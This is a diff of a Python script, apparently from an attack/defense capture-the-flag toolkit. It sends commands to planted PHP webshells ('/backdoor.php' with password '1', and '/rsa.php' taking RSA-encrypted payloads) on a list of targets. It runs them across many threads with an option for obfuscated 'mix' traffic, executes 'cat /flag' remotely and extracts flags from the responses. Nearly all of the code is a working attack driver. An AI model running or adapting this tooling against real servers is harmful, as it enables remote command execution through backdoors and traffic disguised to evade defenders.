@@ -6,84 +6,101 @@ import sys
 import re
 import base64
 
-from common import logger, rsa_encrypt, rsa_decrypt
+from common import logger, rsa_encrypt, rsa_decrypt, callback_default
 from config import FLAG_PATTERN
 from mix import NormalRequest, MixRequest
 from exps import *
 
 
-def attack_upload_shell_eval():
-    pass
+def test_rsa():
+    """测试 RSA Agent
+    """
+    logger.info("[+] Start Test RSA...")
+    text = 'test'+'asdveaw' * 10
+    logger.debug("Origin Text : %s" % text)
+    text = rsa_encrypt(text)
+    logger.debug("RSA Encrypt : %s" % text)
+    text = rsa_decrypt(text)
+    logger.debug("RSA Decrypt : %s" % text)
 
 
-def upload_shell_rce():
-    pass
+def attack_by_normal_request(targets, shell, passwd, payload, threads=10, callback=None):
+    """普通攻击封装
+    """
+    logger.info("[+] Init Normal Request...")
+    if not passwd and not isinstance(payload, dict):
+        req = NormalRequest(shell, passwd, payload, targets)
+    else:
+        req = NormalRequest(shell, passwd, payload, targets)
+    if not callback:
+        req.callback.append(callback_default)
+    else:
+        req.callback.append(callback)
+    req.start(threads)
 
 
-def upload_agent():
-    pass
+def attack_by_mix_request(targets, shell, passwd, payload, threads=10, callback=None):
+    """混淆流量攻击封装
+    """
+    logger.info("[+] Init Mix Request...")
+    if not passwd and not isinstance(payload, dict):
+        req = MixRequest(shell, passwd, payload, targets)
+    else:
+        req = MixRequest(shell, passwd, payload, targets)
+    if not callback:
+        req.callback.append(callback_default)
+    else:
+        req.callback.append(callback)
+    req.start(threads)
+
+
+def test_normal(targets, payload):
+    """测试 Normal
+    """
+    logger.info("[+] Start Test [Normal]...")
+    attack_by_normal_request(targets, "/backdoor.php", "1", payload, 1)
+
+
+def test_normal_rsa(targets, payload):
+    """测试 Normal + RSA
+    """
+    logger.info("[+] Start Test [RSA + Normal]...")
+    payload = rsa_encrypt(payload)
+    attack_by_normal_request(targets, "/rsa.php", 0, payload, 1)
+
+
+def test_mix(targets, payload):
+    """测试 Mix
+    """
+    logger.info("[+] Start Test [Mix]...")
+    attack_by_mix_request(targets, "/backdoor.php", "1", payload,  1)
+
+
+def test_mix_rsa(targets, payload):
+    """测试 Mix + RSA
+    """
+    logger.info("[+] Start Test [RSA + Mix]...")
+    payload = rsa_encrypt(payload)
+    attack_by_mix_request(targets, "/rsa.php", 0, payload, 1)
 
 
 def attack_upload_shell():
+    targets = ['127.0.0.1:8085']
     payload = exp_upload_shell_rsa_abs()
-    req = NormalRequest("backdoor.php", {"1": payload}, ['127.0.0.1:8085'])
-    req.callback = callback_log
+    req = NormalRequest("backdoor.php", "1", payload, targets)
+    req.callback = callback_default
     req.start(1)
 
 
-def callback_log(t, c):
-    logger.info("[+] ====== Recv Data ======")
-    logger.debug(c)
-    m = FLAG_PATTERN.findall(c)
-    if m and m[0] and m[0][3]:
-        logger.info("[+] Recv Flag : %s -> [[%s]]" % (t, m[0][3]))
-    logger.info("[+] ====== Recv Data ======")
-
-
-def attack_by_mix_request(targets, shell, payload, threads=10, callback=None, rsa=0):
-    logger.info("[+] Init MixRequest...")
-    if rsa and not isinstance(payload, dict):
-        req = MixRequest(shell, payload, targets, rsa)
-    else:
-        req = MixRequest(shell, payload, targets)
-    if callback:
-        req.callback.append(callback_log)
-    req.start(threads)
-
-
-def attack_by_normal_request(targets, shell, payload, threads=10, callback=None, rsa=0):
-    logger.info("[+] Init NormalRequest...")
-    if rsa and not isinstance(payload, dict):
-        req = NormalRequest(shell, payload, targets, rsa)
-    else:
-        req = NormalRequest(shell, payload, targets)
-    if not callback:
-        req.callback.append(callback_log)
-    req.start(threads)
-
-
-def test_attack_by_normal_request():
-    # logger.debug("[+] Start Test EXP...")
-    # payload = {
-    #     "1": exp_system('cat /flag')
-    # }
-    # attack_by_normal_request(['127.0.0.1:8085'], "/backdoor.php", payload, 1)
-    logger.debug("[+] Start Test RSA EXP...")
-    payload = exp_system('cat /flag')
-    payload = rsa_encrypt(payload)
-    # logger.toggleDebug()
-    # payload = exp_upload_shell_rsa_abs()
-    attack_by_normal_request(['127.0.0.1:8085'], "/rsa.php", payload, 1, rsa=1)
-
-
-def test_rsa():
-    logger.debug("[+] Start Test RSA...")
-    a = rsa_encrypt('test'+'asdveaw' * 100)
-    b = rsa_decrypt(a)
-    print(a, b)
-
-
 if __name__ == '__main__':
-    logger.info("[+] Start...")
-    # test()
-    test_attack_by_normal_request()
+    logger.info("[+] Testing...")
+    # targets = ['127.0.0.1:8085']
+    targets = ['127.0.0.1:8085' for i in range(10)]
+    payload = exp_system('cat /flag')
+    # logger.toggleDebug()
+    # test_rsa()
+    # test_normal(targets, payload)
+    # test_normal_rsa(targets, payload)
+    # test_mix(targets, payload)
+    test_mix_rsa(targets, payload)
+    # logger.toggleDebug()
